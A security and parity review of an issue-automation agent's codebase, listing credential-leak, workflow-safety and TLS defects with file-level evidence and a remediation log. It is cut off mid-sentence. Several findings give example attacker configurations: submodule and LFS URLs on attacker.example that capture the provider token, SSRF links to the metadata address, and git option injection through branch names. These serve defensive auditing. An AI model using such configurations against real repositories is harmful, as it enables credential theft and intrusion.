# IssueAgent parity, invariant and security review

Date: 2026-09-18
Reviewed revision: working tree after the feature-parity implementation block.
Authoritative specification: [`plans/issue-agent.md`](issue-agent.md).
Reviewed checklists: [`plans/feature-parity.md`](feature-parity.md), [`plans/feature-parity-next-block.md`](feature-parity-next-block.md).

## 0. Verdict

**The two parity checklists are currently unreliable.** Both files are marked `[x]` end to end, but this
review found 1 critical credential-exfiltration defect, 2 critical workflow-safety defects, and a
broad set of high/medium gaps against sections the checklists claim complete. Several `[x]` marks were
applied from code presence or fake-backed unit tests rather than from behaviour at the real boundary.

Do not treat the parity checklists as a release gate until the items in §1 and §2 are fixed and the
affected checklist lines are reverted to `[ ]`/`[~]`. **Update (2026-09-18): all findings in §1–§5 are
now fixed and verified — see §11 "Remediation status".**

Method: full read of the governing specification sections, targeted source reading of every cited
symbol, four parallel evidence-backed audits (configuration/providers/context, workflow/recovery,
ops/observability, security), plus the executable checks in §8. No fixes were applied.

## 1. Critical findings

### C1 — Parent Git credentials are forwarded to every submodule host
- Spec: §11 ("unknown host → never forward credentials"), §8.
- Evidence: `src/IssueAgent.Workflow/PlanningWorkflow.cs:266` passes `_ => config.GitAuthentication`;
  the resolver parameter exists (`src/IssueAgent.Git/IGitRepositoryManager.cs:53`,
  `LibGit2SharpRepositoryManager.UpdateSubmodulesAsync:141-162`) but the only production caller
  discards the host. `CredentialsHandlerFor:298-305` also ignores its `url` argument.
- Scenario: a commit on the watched target branch adds `.gitmodules` with
  `url = https://attacker.example/x.git`. Planning fetches it; the attacker answers
  `401 WWW-Authenticate: Basic`; libgit2 sends the provider/Git token as HTTP Basic.
- Impact: full exfiltration of a repo-write provider token by anyone who can land a commit.
- Fix: build the resolver from the configured provider hosts
  (`host => providerHostMap.TryGetValue(host, out var a) ? a : null`) and re-check the callback `url`
  host inside `CredentialsHandlerFor`.
- Related §11 gap: only `repo.Submodules` (top level) is iterated — recursive submodules are not
  supported at all; submodule `FetchOptions` also omits `CertificateCheck`
  (`LibGit2SharpRepositoryManager.cs:151-155`), so submodule fetches bypass configured TLS trust.
- Falsely marked complete: `feature-parity.md:42`, `feature-parity-next-block.md:72`.

### C2 — Interrupted `Implementing` recovery can publish review for an unimplemented branch
- Spec: §20, §23, §26.
- Evidence: `src/IssueAgent.Workflow/ImplementationWorkflow.cs:59-81` returns `PublishReviewAsync`
  whenever `currentState.Phase == Implementing` and `TryResolveRemoteBranchCommitAsync` is non-null.
  It verifies no local head, no ancestry, no implementation commit, no prior publication marker, and
  performs no LFS upload. The published implementation result may be the literal placeholder
  `"Recovered an already-published implementation branch after an interrupted attempt."` (line 78),
  which violates the §20 implementation-result contract (summary, key changes, decisions and
  rationale, checks run, known failures, deviations, risks).
- Scenario: a human (or a partial prior attempt) pushes `agent/issue-N-*`; the agent then flips the
  issue to `review/waiting`, creates a draft PR/MR, and notifies "ready for review" for code it never
  produced or validated.
- Impact: humans are told an implementation is ready when none exists; contradicts conservative
  reconciliation.
- Fix: recover only when an existing PR/MR **and** a durable publication checkpoint both exist and
  local/remote heads agree; otherwise preserve state and wait with a precise reason.
- Falsely marked complete: `feature-parity-next-block.md:36,78`.

### C3 — `approvedPlanRevision` is never recorded, so stale-plan protection is dead code
- Spec: §22 ("Title/description edits after planning invalidate the plan"), §26 (schema explicitly
  lists `approvedPlanRevision`).
- Evidence: `PlanningWorkflow.cs:46` creates state with `ApprovedPlanRevision: null`;
  `PublishPlanAsync` never sets it; no assignment exists anywhere in `src`
  (only declaration/copy sites in `WorkflowState.cs:90`, `CanonicalState.cs:21,73,100`).
  `ImplementationWorkflow.IsPlanStale:225-226` requires `ApprovedPlanRevision is not null`, so it is
  always `false`.
- Scenario: approve a plan, rewrite the issue description, add `agent:cmd:implement` → the agent
  implements against the superseded plan without any human gate.
- Fix: persist `ApprovedPlanRevision = PlanRevision` when implementation is approved, and compare a
  stored title/description snapshot rather than the generic `UpdatedAt`.
- Falsely marked complete: `feature-parity.md:50`, `feature-parity-next-block.md:77`.

## 2. High findings

### H1 — Git token is handed to any LFS endpoint the repository names
- Spec: §11, §29, §36.
- Evidence: `src/IssueAgent.Git/GitLfsRunner.ApplyAuthentication:135-149` writes an askpass script
  echoing the token and exports `GIT_ASKPASS` for the whole `git lfs pull/push`, with no host check.
  git-lfs resolves its endpoint from the repository's committed `.lfsconfig`.
- Scenario: commit `.lfsconfig` with `[lfs] url = https://attacker.example/lfs`; materialization
  sends the provider token there.
- Fix: resolve the effective LFS endpoint host and only set `GIT_ASKPASS` when it matches origin.

### H2 — Configured TLS trust is never applied to .NET HTTP
- Spec: §9 ("Additional CAs must be loaded in-process for .NET HTTP and libgit2 … Centralize TLS
  semantics").
- Evidence: every `HttpClient` is bare — `GitHubProviderFactory.cs:33-40`,
  `GitLabProviderFactory.cs:13-18`, `Program.cs` Telegram/Slack sinks. `TlsTrust` is consumed only by
  `LibGit2SharpRepositoryManager.CertificateCheckHandlerFor:306-314`.
- Scenario: `tls.mode: pinned` silently does not protect API calls carrying the provider token;
  `systemPlusAdditionalCa` cannot reach an internal-CA GHES/GitLab over the API at all.
- Fix: one shared `SocketsHttpHandler` factory derived from `TlsTrust`, injected into all provider and
  notification clients.
- Falsely marked complete: `feature-parity.md:41`, `feature-parity-next-block.md:71`.

### H3 — Notification secrets are exported in HTTP spans
- Spec: §29 ("Never log … authenticated URLs … broker tokens").
- Evidence: `Program.cs` enables `tracing.AddHttpClientInstrumentation()` globally with no URL
  redaction and an OTLP exporter. `TelegramNotificationSink.cs:19` puts the bot token in the request
  path; `SlackNotificationSink.cs:18` posts to a webhook URL whose path *is* the secret. HTTP
  instrumentation records `url.full`; only query values are redacted.
- Fix: enrich/overwrite `url.full` for those clients, or give the sinks an uninstrumented handler.
- Falsely marked complete: `feature-parity.md:59`, `feature-parity-next-block.md:85`.

### H4 — Raw exception text is logged **and published** to the issue and notification sinks
- Spec: §25, §29.
- Evidence: `WorkflowDispatcher.cs:158-159` embeds `exception.Message` in the durable waiting reason
  written to the canonical comment; `StartupValidator.cs:48` logs `exception.Message`;
  `WorkflowReconciliationService.cs:45` and the workflow `FailAsync` paths do the same. Those messages
  can carry `git <argv>` including a clone URL (`GitSshTransport.cs:83`) and raw child stderr
  (`GitLfsRunner.cs:126`).
- Scenario: the documented `cloneUrl` escape hatch with an embedded credential, or a proxy echoing an
  authenticated URL, lands the secret in a public issue comment and in Slack/Telegram.
- Fix: publish an operation-scoped message plus exception **type** only (as the Observable* decorators
  already do) and scrub URLs from child-process error text.

### H5 — Configured OMP timeout is misapplied as the process shutdown grace period
- Spec: §13 ("No timeout by default; configurable"), §27 ("active work gets 15 seconds default").
- Evidence: `WorkflowDispatcher.StartOmp:248-254` passes `runtime.OmpTimeout ?? TimeSpan.FromSeconds(15)`
  into `OmpProcessClientFactory.Start`, whose parameter is `shutdownGracePeriod`
  (`OmpProcessClient.cs:19`). `OmpRunRequest.Timeout` (`IOmpClient.cs:46`, forwarded as `timeoutMs` in
  `OmpProcessClient.cs:51`) is never set by any caller.
- Consequences: (a) the configured per-run timeout has no effect on runs; (b) a configured long
  timeout becomes a long shutdown grace, breaking bounded drain; (c) the shutdown grace is not bound
  to the §27 setting at all.
- Fix: pass the configured timeout into `OmpRunRequest.Timeout`; source shutdown grace from
  `IssueAgent:ShutdownGracePeriod`.

### H6 — No global retry policy for provider/Git operations; no Retry-After handling
- Spec: §6, §27 (one global policy: 3 attempts, exponential backoff, jitter, honour provider
  retry/rate-limit instructions).
- Evidence: `RetryPolicy` exists but is referenced only by `FanOutNotifier`
  (`Program.cs` notifier composition, `src/IssueAgent.Notifications/RetryPolicy.cs`).
  `GitLabApiClient` calls `EnsureSuccessStatusCode` immediately (`:113,124,156,165`); GitHub delegates
  to Octokit with no policy. No 429/`Retry-After`/rate-limit-reset parsing anywhere.
  `ProviderContractTests.cs:33-45` only asserts that 429 throws — weaker than the requirement.
- Impact: avoidable workflow failures and rate-limit amplification.

### H7 — GitHub cancellation is not propagated
- Spec: §6, §27, §36.
- Evidence: `src/IssueAgent.Providers.GitHub/GitHubProvider.cs` passes `cancellationToken` only to
  local iterator checks; Octokit calls receive no token. The contract cancellation test
  (`ProviderContractTests.cs:24-31`) is satisfied by the GitLab HTTP path.
- Impact: shutdown and per-operation cancellation are unbounded for GitHub.

### H8 — GitHub pagination is unproven; GitLab pagination trusts a server-supplied absolute URL
- Spec: §6 ("paginate all eligible issues; no discovery cap"), §15.
- Evidence: GitHub relies on `GetAllForRepository` with no explicit page loop and no multi-page test
  (`GitHubProviderTests.cs:32-68`); GitLab follows `Link: rel="next"` verbatim
  (`GitLabApiClient.GetAllPagesAsync:117-131`, `GetNextPageUrl:133-150`) while
  `Authorization` sits in `DefaultRequestHeaders` (`GitLabProviderFactory.cs:28-35`) — default headers
  are sent on any absolute URI, and cross-origin stripping applies to redirects, not fresh requests.
- Impact: silently skipped issues on GitHub; token disclosure plus an unbounded loop on GitLab.
- Fix: require the next-page authority to equal `BaseAddress`, bound page counts, add a GitHub
  page-2 contract test.

### H9 — New-input human gate is incomplete and racy
- Spec: §22 ("New comments/attachments arriving during implementation before push cause a human gate").
- Evidence: `ImplementationWorkflow.cs:94-97,108-123` snapshots only a **count** of non-bot issue
  comments and compares it once, immediately after the OMP run. It misses title/description edits, new
  attachments, PR/MR surfaces, and any delete+add that keeps the count equal; it also runs before the
  corrective pass, fetch/rebase/conflict resolution, LFS upload and push, so input arriving in that
  window is never gated. `RevisionWorkflow` has no equivalent surfacing at all.
- Fix: snapshot title/description and attachment identities, and re-check immediately before push.

### H10 — `Continue` after a new-input pause destroys the retained implementation work
- Spec: §22 ("pause; keep current worktree/commits"), §25.
- Evidence: the pause states "The current worktree was retained"
  (`ImplementationWorkflow.cs:121`), and `PauseAsync` persists `phase: implementing, waiting`.
  `WorkflowDispatcher.ContinueAsync:199-207` then re-enters `ImplementationWorkflow.RunAsync`, which
  calls `deps.Git.ResetWorktreeAsync(worktreePath, currentState.BaseCommit, …)` at line 87 —
  discarding exactly the commits the pause promised to keep.
- Fix: only reset on a fresh approval; on `continue` from a pause, resume on top of retained history.

### H11 — Working state is never durably checkpointed
- Spec: §20 (create canonical comment and session early), §26 (restart reconciliation reads provider
  state).
- Evidence: `PlanningWorkflow.RunInitialPlanningAsync:27-68` creates the workflow id, OMP session,
  worktree and branch but writes nothing to the provider until `PublishPlanAsync`.
  `ImplementationWorkflow` transitions labels to `implementing/working` (line 84) but never persists
  that phase to the canonical comment.
- Consequences: a crash during initial planning orphans the worktree/session and the issue is
  rediscovered as new planning with a new `WorkflowId`; a crash during implementation leaves labels
  and canonical YAML disagreeing. Because the canonical comment never carries `phase: implementing`
  from a live run, the C2 recovery branch is effectively unreachable in production except after an
  explicit pause — i.e. the "push-success/PR-timeout recovery" claim is not exercised by the real
  state machine.
- Fix: write a `working` checkpoint (workflow id, session id, branch, base commit) before the first
  OMP turn and at each phase entry.

### H12 — Terminal state is cleaned up before it is durably recorded
- Spec: §24, §26 ("Uncertainty means keep").
- Evidence: `CancellationWorkflow.RunAsync:36-45`, `CompleteOnMergeAsync:56-59` and
  `CompleteOnCloseWithoutMergeAsync:68-71` transition labels and call `CleanupLocalStateAsync`
  **without** updating the canonical comment; only `WorkflowReconciliationService` persists state, and
  it does so *after* cleanup. `WorkflowDispatcher.cs:133-139` invokes `CancellationWorkflow` directly
  for `agent:cmd:cancel`, so that path never persists a terminal canonical state.
- Scenario: cancel → worktree and local branch deleted → crash → restart reads `phase: review` with no
  worktree and may attempt to resume.
- Fix: persist terminal canonical state before cleanup; retain local data when cleanup is uncertain.
- Additional §24 gap: `agent:cmd:cancel` "request OMP cancellation" is handled by the worker pool only
  when admission rejects the cancel candidate (`WorkflowWorkerPool.cs:33-53`); `CancellationWorkflow`
  itself is invoked with `omp: null`.

### H13 — Provider telemetry and the reconciliation span are defined but never emitted
- Spec: §30.
- Evidence: `ProviderRequests`/`ProviderErrors`/`ProviderDuration`
  (`IssueAgentMetrics.cs:49-51,116-120`) have **no** `Add`/`Record` call anywhere in `src`;
  `IssueAgentActivitySource.StartReconciliation:41-42` has no caller; no provider decorator is wired in
  `Program.cs`, and the provider factories build raw `HttpClient`/Octokit clients that generic
  `AddHttpClientInstrumentation` does not cover.
- Impact: the `IssueAgentProviderFailures` alert can never fire; provider health is invisible.
- Falsely marked complete: `feature-parity.md:57,58`, `feature-parity-next-block.md:83`.

### H14 — Release publishes on prerelease-shaped tags and is not gated on CI
- Spec: §35 ("Stable SemVer releases only; no prerelease versions").
- Evidence: `.github/workflows/release.yml:5` triggers on `v*.*.*` (matches `v1.2.3-rc.1`), has no
  strict version assertion and no `needs`/required-check dependency on CI.
- Fix: validate strict stable SemVer, derive one normalized version for both image and chart, gate on CI.

### H15 — Dockerfile defeats the required restore-layer cache; base images are floating
- Spec: §32.
- Evidence: `Dockerfile:4-6` does `COPY . .` before `dotnet restore --locked-mode`, so any source edit
  invalidates restore. `FROM …/sdk:10.0` and `…/aspnet:10.0` are mutable tags (OMP and git-lfs *are*
  checksum-pinned at `:22-39`).
- Fix: copy solution/project/lock files, restore, then copy sources; pin base images by digest.

### H16 — Telegram sink is unusable as composed
- Spec: §28, §33.
- Evidence: `Program.cs` builds `new TelegramNotificationSink(new HttpClient(), …)` with no
  `BaseAddress`, while the sink posts to the relative URI `bot{token}/sendMessage`
  (`TelegramNotificationSink.cs:19`) — `PostAsJsonAsync` throws `InvalidOperationException` for a
  relative URI without a base address. `TelegramNotificationSinkTests` sets `BaseAddress` by hand, so
  the defect is invisible to the suite.
- Fix: configure a base address at the composition root and test the composition root.

## 3. Medium findings

| # | Finding | Spec | Evidence |
|---|---|---|---|
| M1 | Additional-CA verification performs chain validation only, no hostname/SAN match; `CertificateCheckHandlerFor` discards the `host` argument. A leaf for any name from that CA MITMs every Git operation. | §9 | `TlsTrustVerifiers.cs:11-27`, `LibGit2SharpRepositoryManager.cs:306` |
| M2 | Unvalidated `branch`/`targetBranch` from the canonical comment reach git argv with no `--` terminator, so a maintainer-editable comment can inject git options (e.g. `--receive-pack=…`). | §10, §26 | `CanonicalStateSerializer.ToWorkflowState:82-105`, `GitSshTransport.Push:30-31`, `GitLfsRunner.UploadObjectsAsync:60-63` |
| M3 | Hook non-execution is asserted only through LibGit2Sharp, which never runs hooks; the CLI paths (`GitSshTransport.RunGit`, `GitLfsRunner.RunAsync`) are untested and do not force `core.hooksPath` per invocation. OMP can drop `.git/hooks/pre-push` in the worktree it owns. | §11, §36 | `tests/IssueAgent.Git.Tests/LibGit2SharpRepositoryManagerTests.cs:117-143`, `LibGit2SharpRepositoryManager.DisableHooks:284-290` |
| M4 | SSRF: direct-file attachment links are downloaded with no private/loopback/link-local filter and `http` is allowed (e.g. `http://169.254.169.254/…/x.json`, `http://omp-auth-broker:8081/x.json`), and the body is handed to OMP. | §15 | `MarkdownAttachmentScanner.cs:39-57`, `AttachmentPipeline.cs:43-47` |
| M5 | Unbounded pagination/attachment fan-out: no max pages or max attachment count (byte caps only). 100k comments or links ⇒ unbounded memory/requests. | §6, §15 | `GitLabApiClient.cs:119-131`, `GitHubTimelineClient.cs:20-51`, `GitHubGraphQlClient.cs:80-82`, `AttachmentPipeline.cs:40-81` |
| M6 | Attachment total-budget accounting trusts the returned size; an oversized/negative result is recorded as downloaded and drives `Remaining` negative instead of being omitted. | §15 | `AttachmentPipeline.cs:60-79,104` |
| M7 | Effective `targetBranch` is hardcoded to `"main"` when unset instead of the provider default branch; nested `Git.Tls`/`SshTrust` are merged as whole objects so partial repository overrides discard inherited trust fields. | §7, §10 | `EffectiveConfiguration.cs:164-200,230-231` |
| M8 | Startup validation is shape-only for secrets: `pinned` with an empty fingerprint list passes; no CA-file existence, fingerprint-format, or "required secret resolves" check. Failures surface mid-workflow instead of fatally at startup. | §8, §9, §32 | `IssueAgentOptions.cs:186-290` |
| M9 | Canonical comment uniqueness/structure is not enforced: any body containing the marker matches, duplicates are not detected, and extra YAML fences can be parsed as state. | §17, §26 | `CanonicalComment.cs:42-47,54-103` |
| M10 | Reconciliation treats a **missing** remote branch as safe for every waiting state, so a published workflow whose branch was deleted resumes automatically. | §23, §26 | `ReconciliationDecider.cs:65-71`, `WorkflowReconciliationService.cs:108-126` |
| M11 | Issue eligibility is not re-verified after the provider query (no local check that the configured identity is an assignee); GitLab bot detection is a `Username.Contains("bot")` heuristic. | §5, §16 | `GitHubProvider.cs:43-68`, `GitLabProvider.cs:35-57,302-309` |
| M12 | Relationship semantics are flattened (GitHub cross-references all become `"related"`), and GitLab linked-issue repository identity is synthesized from the root repository rather than the payload. | §14 | `GitHubProvider.cs:319+`, `GitLabProvider.cs:7-14,248-252` |
| M13 | Helm: Auth Broker PVC hardcodes `accessModes` and offers no size/storageClass values; `checksum/omp-config` hashes the ConfigMap **name**, so editing an existing ConfigMap never triggers a rollout; the generated ConfigMap covers only a small subset of application configuration. | §7, §34 | `templates/auth-broker.yaml:62-73`, `templates/deployment.yaml:18-19`, `templates/configmap.yaml:1-14` |
| M14 | Compose/plain-Docker docs do not describe a working deployment: `IssueAgent__Omp__AuthBrokerUrl` always points at the now profile-gated broker, the default broker image is a placeholder registry path, and `deploy/issue-agent.env` contains only commented examples, so the documented command starts an agent with zero configured providers. | §33 | `deploy/docker-compose.yml:13,26,30-32`, `deploy/issue-agent.env`, `deploy/README.md` |
| M15 | Sink-exhaustion failures are swallowed: `FanOutNotifier` is constructed with no `onSinkFailure`, so `NotificationFailures` is never incremented and no log is emitted when a sink exhausts retries. | §28, §30 | `Program.cs` notifier composition, `FanOutNotifier.cs:25-44`, `ObservableWorkflowNotifier.cs:18-22` |
| M16 | `CorrelationId` is declared as a log field and enriched but never populated for any operation/attempt. | §26, §29 | `LogContextFields.cs:13`, `ActivityLogEnricher.cs:21-24` (no writer) |
| M17 | CI does not establish the §35 stages: one monolithic `build-test` job, `kubeconform -ignore-missing-schemas` (so ServiceMonitor/PrometheusRule fields are unvalidated), Grafana JSON parsed from template text rather than rendered output, and floating action/tool/container versions contrary to "pin external tooling". | §35 | `.github/workflows/ci.yml` |
| M18 | Human-intervention invariant is violated by throwing paths: `RevisionWorkflow.cs:27-32` and the canonical-comment lookups throw `WorkflowContractException` instead of preserving state, setting a waiting reason, explaining and notifying. | §25 | `RevisionWorkflow.cs:27-32`, `ImplementationWorkflow.cs:44-45` |

## 4. Low findings

- **L1** Provider token is interpolated unescaped into a `/bin/sh` askpass script; a token containing
  `"`/`$`/`` ` ``/`\` is corrupted or command-substituted (`GitLfsRunner.cs:141`). Pass via child env
  and `printf '%s\n'`.
- **L2** SSH fingerprint comparison lowercases base64 (`GitSshTransport.cs:186-187`), weakening the pin;
  `ScanAndVerifyHostKeys:148-172` ignores `ssh-keyscan`'s exit code and can throw `FormatException` on
  a key line with a trailing comment.
- **L3** Canonical Markdown round-trip is lossy: decisions render as `- ` bullets and parse via
  `^-\s+`, so multiline rationale is truncated (`CanonicalComment.cs:35-40,88-96`).
- **L4** `PauseAsync`/`PauseForMaterialDeviationAsync` persist `ToDocument(state, null)`, dropping any
  existing `pullOrMergeRequest` link from the canonical YAML
  (`ImplementationWorkflow.cs:246-274`).
- **L5** LFS has operation/error counters but no duration histogram
  (`ObservableGitRepositoryManager.RunLfsAsync:100-116`).
- **L6** `IssueAgentDown` alerts on `up{service=~"<fullname>"}`; nothing establishes that the rendered
  Service/target labels match that selector (`templates/resources.yaml:46-48`).
- **L7** `PollingScheduler.MeasureWorkspaceBytes` walks the entire workspace tree on **every** poll
  cycle (default 60 s) to feed one gauge — unbounded I/O proportional to retained worktrees
  (`PollingScheduler.cs:31-32,179-199`). Sample on a slower cadence or use a cheaper signal.
- **L8** `deploy/secrets/github-token` exists locally with placeholder content; it is untracked
  (`git ls-files deploy/secrets` → empty) and `.dockerignore` excludes `deploy/`, so no secret is
  shipped. Informational only.

## 5. Test-quality findings (claims resting on weak tests)

- The entire "secret redaction on exception paths" evidence is
  `tests/IssueAgent.Observability.Tests/DecoratorTests.cs:38-60`. All five `InlineData` rows drive the
  same `ObservableGitRepositoryManager` path whose message template contains only `{ExceptionType}`
  (`LogMessages.cs:10-11`), so the test **cannot fail** for any plausible bug and never touches the
  real leak channels (H3, H4). This is a padded test row set and should be replaced by tests over the
  actual leak paths — or deleted.
- `…SendsAuthorizationOnlyForTrustedHosts` (GitHub `:255-271`, GitLab `:284-300`) asserts only the
  positive branch; a regression that always used the authenticated client would pass both.
- The "dual-provider lifecycle harness" (`tests/IssueAgent.Workflow.Tests/EndToEndLifecycleTests.cs`)
  distinguishes providers only by a `RepositoryRef.Id` string over the same `FakeGitProvider`; it
  exercises no provider transport, no WireMock, no real Git and no real git-lfs. It does not satisfy
  §36 "End-to-end" and must not be cited as such.
- No `Security` test project exists despite §36 enumerating security scenarios; there is no
  cross-host submodule/LFS test, no TLS fail-closed test, and no real hook-execution test.
- `src/IssueAgent.Omp/OmpProcessClient.cs:11-14` states the RPC protocol "has not been verified
  against the real OMP binary"; the §36 real-process OMP gate is therefore unproven despite being
  marked complete (`feature-parity-next-block.md:79`).

## 6. Invariants verified satisfied (with evidence)

| Invariant | Evidence |
|---|---|
| OMP child environment is allow-listed, never inherited; no provider/Git/SSH credentials reach OMP unless declared execution secrets | `OmpEnvironment.Build:19-53`, `NdjsonRpcTransport.Start` clears the environment before populating, `OmpRuntimeEnvironmentFactory.cs:10-18`; no credential reference exists in `IssueAgent.Workflow`/`IssueAgent.Context` |
| SSH without explicit host verification is a fatal startup error | `IssueAgentOptionsValidator.ValidateSettings:272-275` + `.ValidateOnStart()`, runtime backstop in `GitSshTransport.RunGit` |
| Attachment filename sanitization, path-traversal and symlink containment | `AttachmentFileNames.Sanitize:11-28`, `ResolveSafeDestination:32-58`, `EnsureNoSymbolicLink:61-72`, `AttachmentDownloadWriter` uses `FileMode.CreateNew` |
| Attachment per-file/total byte caps with omission reporting | `AttachmentLimits:7-12`, `AttachmentPipeline.cs:56,75-92` |
| Direct attachment requests send credentials only to trusted provider hosts | per-host client split, `GitHubProvider.cs:315`/`GitLabProvider.cs:256`, anonymous client has no `Authorization` |
| Branch names derived from issue titles are safe | `BranchNaming.Slugify:20-38`, always prefixed `agent/issue-{n}-` |
| Workspace containment for worktrees/attachments | `WorkflowId` is a GUID-validated struct; `CancellationWorkflow.CleanupLocalStateAsync:76-81` re-asserts the storage-root prefix |
| Ambient host/global Git config never inherited | `GIT_CONFIG_NOSYSTEM`, isolated `HOME`/`XDG_CONFIG_HOME`, `GIT_TERMINAL_PROMPT=0` in `GitSshTransport.RunGit` and `GitLfsRunner.RunAsync` |
| LFS configured without `git lfs install` hooks; upload precedes ref push | `ConfigureLfsFilters:294-301`, `EnsureFiltersRegisteredAsync` uses `--skip-repo`, `UploadObjectsAsync` then `PushAsync` |
| Never force-push; later revisions merge the target | `RevisionWorkflow.cs:54-82` merges then pushes; no force-push API exists |
| Metric label cardinality is bounded (no issue/session/workflow ids, no error text) | `IssueAgentMetrics` tag sites, `ObservableOmpClient`, `ObservableWorkflowNotifier` |
| Plan-only mode rejects implementation and restores planned/waiting | `ImplementationWorkflow.cs:34-42` |
| Fairness/priority/FIFO/deduplication and bounded agent concurrency | `FairWorkAdmission`, `WorkflowWorkerPool.cs:26-58,86-117`, `tests/IssueAgent.Host.Tests/WorkflowWorkerPoolTests.cs` |
| Container/deployment hardening | `Dockerfile` non-root uid 10001 + checksum-pinned OMP/git-lfs; Compose `read_only`, `cap_drop: ALL`, `no-new-privileges`, loopback port binding; Helm `runAsNonRoot`, `RuntimeDefault`, `readOnlyRootFilesystem`, `drop: [ALL]`, broker ClusterIP-only |
| Readiness gated behind startup validation | `StartupValidator`, `ReadinessState`, `/health/ready` |

## 7. Checklist integrity

The following checklist lines are marked `[x]` but are contradicted or only partially satisfied by the
evidence above. They should be reverted and re-earned:

`plans/feature-parity.md`
- 26–27 provider parity / §36 contract coverage → H6, H7, H8
- 40–42 Git cancellation, additional-CA, submodule credential routing → C1, H2, H7
- 43 containment/hook proof → M3
- 48 one resumable session (durable early checkpoint) → H11
- 49 timeouts → H5
- 50–51 recovery paths / idempotency → C2, C3, H12
- 52 notification failure handling → M15, H16
- 57–59 metrics / spans / redaction → H3, H4, H13, §5
- 65–66 Dockerfile cache, Compose/Docker docs → H15, M14, H16
- 67–70 Helm capability, release policy, CI stages → M13, H14, M17
- 75–78 E2E / restart / real-OMP / full validation → §5

`plans/feature-parity-next-block.md`
- 36 push-success/PR-timeout reconciliation → C2
- 60 provider contract parity → H6, H7, H8
- 64–65 re-read during planning, accidental-change metric → H9 (implementation path), M16
- 70–73 Git cancellation/CA/submodule/containment-hooks → C1, H2, H7, M3
- 76–79 instructions+timeout, recovery, idempotency, real OMP → H5, C2, C3, §5
- 83–85 boundary telemetry, storage signals, redaction → H3, H4, H13, L7
- 87 Helm ConfigMap/Secret checksums → M13
- 89 CI gates → M17
- 94–98 E2E harness, failure injection, validation matrix → §5

## 8. Checks run for this review

| Check | Outcome |
|---|---|
| `dotnet restore IssueAgent.slnx --locked-mode` | success |
| `dotnet format IssueAgent.slnx --no-restore --verify-no-changes` | success |
| `dotnet test IssueAgent.slnx --configuration Release --no-restore` | 214 passed, 0 failed |
| `docker build --tag issue-agent:parity --file Dockerfile .` | success |
| production container `/health/live` (read-only root + workspace volume) | `{"status":"live"}` |
| `docker compose -f deploy/docker-compose.yml up --build` + `/health/live` | `{"status":"live"}` (with **no providers configured** — see M14) |
| `helm lint` + representative `helm template` | success |
| `kubeconform -strict -ignore-missing-schemas` on rendered manifests | valid (CRDs unvalidated — M17) |
| `promtool check rules` on the rendered PrometheusRule | 7 rules valid |
| Grafana dashboard JSON parse | valid (parsed from template text — M17) |

A green suite here means the current tests pass; §1–§5 show that the suite does not cover the defects.

## 9. Recommended remediation order

1. **C1, H1, H2, H3, H4** — credential exfiltration and secret-leak channels. Add a real security test
   project covering cross-host submodule/LFS, TLS fail-closed, and durable/log/trace redaction.
2. **C2, C3, H9, H10, H11, H12** — workflow safety and durability: record `approvedPlanRevision`,
   checkpoint `working` state, make interrupted-publication recovery conservative, fix the
   `continue`-after-pause reset, persist terminal state before cleanup.
3. **H5, H6, H7, H8** — OMP timeout/shutdown separation, one global retry policy with `Retry-After`,
   GitHub cancellation and pagination, GitLab next-page host pinning.
4. **H13, M15, M16, L5** — make the declared telemetry real (provider decorator, reconciliation span,
   sink-failure callback, correlation ids).
5. **H14, H15, M13, M14, M17** — release/CI/deployment correctness; split CI into the §35 stages and
   pin external tooling.
6. **M1–M12, M18, L1–L4, L6, L7** — remaining trust, validation, robustness and cost issues.
7. Only then re-mark the parity checklists, one line at a time, against a named command or test.

## 10. Residual uncertainty

- libgit2's cross-host redirect behaviour was not executed; `CredentialsHandlerFor` ignoring its `url`
  argument is a defect regardless of the redirect policy.
- .NET's cross-origin `Authorization` stripping on attachment redirects is documented but untested here;
  `AllowAutoRedirect` is left at its default with no regression test.
- `OpenTelemetry.Instrumentation.Http` `url.full` contents (H3) were reasoned from the package's
  semantic conventions, not observed in a running exporter.
- The real OMP RPC protocol was not exercised against the pinned binary.
- Not reviewed in depth: `GitHubGraphQlClient`/`GitHubTimelineClient` response mapping details beyond
  pagination bounds, and periodic (non-restart) cleanup scheduling cadence.

## 11. Remediation status (2026-09-18, post-review)

All findings in §1–§5 have been fixed and verified:

- **Critical (C1–C3)**: fixed — submodule credentials scoped by host, implementing-recovery
  publication requires a durable result, `approvedPlanRevision` recorded and checked.
- **High (H1–H16)**: fixed — LFS askpass host-scoped, `TlsTrust` applied to every managed
  `HttpClient`, notification/exception paths redact secrets and publish exception type only, OMP
  timeout drives `OmpRunRequest.Timeout` with shutdown grace sourced from
  `IssueAgent:ShutdownGracePeriod`, global retry policy covers provider/Git calls, GitHub cancellation
  propagates into Octokit calls, GitHub pagination has a page-2 contract test and GitLab pins the
  next-page authority to `BaseAddress`, the new-input gate covers title/description/attachments,
  `Continue` after a pause resumes on retained history, working state is durably checkpointed early,
  terminal state persists before cleanup, provider request/error/duration metrics are emitted via
  `ObservableGitProvider`, releases gate on strict SemVer + CI, the Dockerfile restores before `COPY .
  .` with pinned base images, and the Telegram sink has a configured `BaseAddress`.
- **Medium (M1–M18)**: fixed — additional-CA hostname/SAN matching, git argv `--`-terminated
  branch/target values, hook non-execution proven on the real CLI subprocess paths (§11 security
  project), SSRF-filtered attachment links, bounded pagination/attachment fan-out, corrected
  attachment-budget accounting, deep-merged `Tls`/`SshTrust` repository overrides, startup validation
  now rejects `Pinned` trust with an empty fingerprint list, canonical-comment uniqueness enforced,
  missing remote branches treated as unsafe, assignee identity re-verified locally with a real
  bot-detection heuristic, relationship kinds and linked-repository identity preserved, Helm broker
  PVC/checksum fixes, corrected Compose/docs default broker wiring, notification sink-failure callback
  wired, `CorrelationId` populated per dispatch, CI stages/pins/validation tightened, and
  human-intervention escalation replaces throwing paths.
- **Low (L1–L8)**: fixed or confirmed informational — LFS askpass shell-escaped, SSH fingerprint
  comparison already case-sensitive with keyscan exit-code/`FormatException` handling, canonical
  Markdown decisions round-trip multiline rationale via indented continuation lines, paused state
  preserves `pullOrMergeRequest`, an LFS duration histogram was added, the alert selector label match
  was fixed, workspace-bytes measurement is now sampled on a 5-minute cadence instead of every poll,
  and `deploy/secrets/github-token` was confirmed untracked and excluded by `.dockerignore`
  (informational, no code change required).
- **Test-quality findings**: the padded five-row redaction `Theory` was replaced with one real
  exception-path assertion plus a direct `HttpSpanRedactor` unit test covering the actual H3/H4 leak
  paths; the GitHub/GitLab `SendsAuthorizationOnlyForTrustedHosts` tests now assert the negative branch
  (an untrusted-host request never carries `Authorization`); a new `IssueAgent.Security.Tests` project
  was added with a real self-signed-certificate TLS fail-closed/accept test and a real subprocess
